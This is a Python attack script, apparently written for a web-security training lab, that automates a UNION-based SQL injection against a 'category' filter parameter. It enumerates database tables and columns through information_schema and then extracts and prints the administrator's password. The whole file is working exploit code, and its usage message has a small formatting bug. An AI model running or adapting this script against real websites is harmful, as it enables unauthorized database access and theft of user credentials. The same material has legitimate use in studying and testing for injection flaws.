import requests
import sys
import urllib3
from bs4 import BeautifulSoup as BS
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def perform_request(url, sql_payload):
    path = '/filter?category=' 
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    return r.text


def exploit_sqli_users_table(url):
    sql_payload = "' UNION SELECT table_name, NULL FROM information_schema.tables--"
    res = perform_request(url, sql_payload)
    soup = BS(res, 'html.parser')
    users_table = soup.find(text=re.compile('.*users.*'))
    if users_table:
        return users_table
    else:
        return False


def exploit_sqli_users_columns(url, users_table):
    sql_payload = f"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '{users_table}'--"
    res = perform_request(url, sql_payload)
    soup = BS(res, 'html.parser')
    usernames_column = soup.find(text=re.compile('.*username.*'))
    passwords_column = soup.find(text=re.compile('.*password.*'))
    return usernames_column, passwords_column


def exploit_sqli_administrator_password(url, users_table, usernames_column, passwords_column):
    sql_payload = f"' UNION SELECT {usernames_column}, {passwords_column} FROM {users_table}--"
    # sql_payload = "' UNION SELECT %s, %s FROM %s--" % (usernames_column, passwords_column, users_table)
    res = perform_request(url, sql_payload)
    soup = BS(res, 'html.parser')
    admin_password = soup.find(text='administrator').parent.findNext('td').contents[0]
    return admin_password


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s <url>' % sys.argv[0])
        print('[-] Example: $s www.example.com' % sys.argv[0])
        sys.exit(-1)
    print('[+] Looking for a users table...')
    users_table = exploit_sqli_users_table(url)
    if users_table:
        print('[+] Found the users table name: %s' % users_table)
        usernames_column, passwords_column = exploit_sqli_users_columns(url, users_table)
        if usernames_column and passwords_column:
            print('[+] Found the usernames column name: %s' % usernames_column)
            print('[+] Found the passwords column name: %s' % passwords_column)
            admin_password = exploit_sqli_administrator_password(url, users_table, usernames_column, passwords_column)
            if admin_password:
                print('[+] Found the administrator password: %s' % admin_password)
            else:
                print('[-] Did not find the administrator password.')

        else:
            print('[-] Did not find the usernames and/or the passwords columns.')
    else:
        print('[-] Did not find a users table.')

